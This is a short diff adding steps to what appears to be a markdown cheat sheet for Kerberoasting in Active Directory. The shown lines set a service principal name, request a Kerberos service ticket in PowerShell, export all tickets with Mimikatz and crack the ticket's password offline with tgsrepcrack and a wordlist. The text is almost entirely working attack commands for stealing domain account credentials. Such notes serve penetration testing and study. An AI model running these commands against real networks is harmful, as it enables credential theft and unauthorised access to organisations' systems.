@@ -447,4 +447,13 @@ Set-ADUser -Identity User01 -ServicePrincipalNames @{Add='ops/whatever1'}
 Add-Type -AssemblyNAme System.IdentityModel
 # Step 2 - Request a ticket
 New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "ops/whatever1"
+# Check if the ticket has been granted
+klist
+```
+**4. Export all tickets and Bruteforce the password:**
+```powershell
+# Export all tickets using Mimikatz
+Invoke-Mimikatz -Command '"kerberos::list /export"'
+# Brute force the password with tgsrepcrack
+python.exe .\kerberoast\tgsrepcrack.py .\kerberoast\wordlists.txt '.\3-40a10000-user01@ops~whatever1-CORP.CORPORATE.LOCAL.kirbi'
 ```
